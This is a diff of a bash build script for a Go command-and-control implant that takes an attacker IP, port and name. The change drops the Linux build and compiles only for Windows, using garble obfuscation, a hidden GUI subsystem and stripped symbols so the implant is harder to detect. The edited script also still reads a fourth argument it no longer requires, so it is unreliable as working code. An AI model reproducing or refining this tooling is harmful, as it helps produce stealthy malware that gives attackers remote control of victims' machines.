@@ -2,24 +2,19 @@
 #generates a single implant with a UUID from dev/urandom and given user inputs (ip, portnum, name).
 #"""cool""" banner to show. (I stole it from ASCII fonts)
 echo "
-  ________ ________                 
- /  _____/ \_____  \_______   ____  
-/   \  ___  /   |   \_  __ \_/ __ \ 
-\    \_\  \/    |    \  | \/\  ___/ 
- \______  /\_______  /__|    \___  >
-        \/         \/            \/ 
+        .__           ________ ________                 
+__  _  _|__| ____    /  _____/ \_____  \_______   ____  
+\ \/ \/ /  |/    \  /   \  ___  /   |   \_  __ \_/ __ \ 
+ \     /|  |   |  \ \    \_\  \/    |    \  | \/\  ___/ 
+  \/\_/ |__|___|  /  \______  /\_______  /__|    \___  >
+                \/          \/         \/            \/ 
     "
 
-if [ $# -ne 4 ] || [ "$1" == "-h" ]; then
+if [ $# -ne 3 ] || [ "$1" == "-h" ]; then
     echo "
-    [:] This script is invoked as '$0 <ip/hostname> <port> <name> <build flag>' and needs each of these arguments to correctly run. 
+    [:] This script is invoked as '$0 <ip/hostname> <port> <name>' and needs each of these arguments to correctly run. 
     [:] you can see this help text by invoking the '-h' flag
     [:] OS flags are 'win' for windows builds, and none or 'lin' for linux builds
-
-    [-] Build flags
-        -w  Windows build
-
-        -l  Linux build 
     "
     exit 0
 fi
@@ -32,9 +27,5 @@ IP=$2
 NAME=$3
 BUILD=$4
 echo "[:]UUID for this implant: $NEW_UUID"
-if [ $BUILD == "win" ]; then
-    env GOOS=windows go build -o $3 -ldflags="-X 'main.uuid=$NEW_UUID' -X 'main.ip=$1' -X 'main.port_str=$2' -X 'main.build=$4' -w -s -buildid=" -trimpath ./implant/implant.go
-else
-    go build -o $3 -ldflags="-X 'main.uuid=$NEW_UUID' -X 'main.ip=$1' -X 'main.port_str=$2' -w -s -buildid=" -trimpath ./implant/implant.go
-fi
+env GOOS=windows garble -tiny build -o $3 -ldflags="-X 'main.uuid=$NEW_UUID' -X 'main.ip=$1' -X 'main.port_str=$2' -X 'main.build=$4' -H=windowsgui -w -s -buildid=" -trimpath ./implant/winplant.go
 echo "[+] implant generated, happy hacking!"
